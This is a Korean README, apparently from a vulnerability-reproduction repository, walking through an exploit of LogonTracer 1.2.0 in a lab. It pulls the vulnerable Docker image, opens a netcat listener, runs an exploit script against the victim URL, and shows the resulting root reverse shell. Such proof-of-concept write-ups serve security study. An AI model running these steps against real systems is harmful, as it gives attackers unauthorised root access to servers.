# 설치 및 실행 순서

#### 0. LogonTracer 설치
취약점이 발견되었던 1.2. 0 버전의 logontracer를 dockerhub에서 내려 받습니다.
<pre> $docker pull jpcertcc/docker-logontracer:v1.2.0 </pre>

#### 1. LogonTracer 실행
다음 명령어로 컨테이너에 올립니다.
<pre> $docker run \
   --detach \
   --publish=7474:7474 --publish=7687:7687 --publish=8080:8080 \
   -e LTHOSTNAME=[IP_ADDR] \
   jpcertcc/docker-logontracer:v1.2.0</pre>

#### 2. shell을 얻을 호스트 nc
shell을 얻을 호스트의 특정 포트를 nc를 이용해서 열어놓습니다.
<pre> 
PS C:\Users\0ppr2s\Desktop\main\nc> .\nc64.exe -lvp {attacker_port}
listening on [any] 8888 ...
</pre>


#### 3. 공격 코드 실행
공격코드를 실행합니다.
<pre> 
dnr6419@DESKTOP-4CJA7LD ~/docker/logon
☺  python3 go.py {attacker_ip} {attacker_port} http://{victime_ip}:8080
</pre>

### 실행 결과 
아래 그림과 같이 공격코드가 정상적으로 실행되어 remote shell을 얻은 것을 볼 수 있습니다.
<pre>
PS C:\Users\0ppr2s\Desktop\main\nc> .\nc64.exe -lvp 8888
listening on [any] 8888 ...
192.168.56.103: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.103] 41858: NO_DATA
/usr/local/src/LogonTracer # ^[[16;30Rid
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/usr/local/src/LogonTracer # ^[[20;30R
</pre>
![image](https://user-images.githubusercontent.com/43310843/120444308-780b2480-c3c2-11eb-9ec0-4a280bc941ab.png)
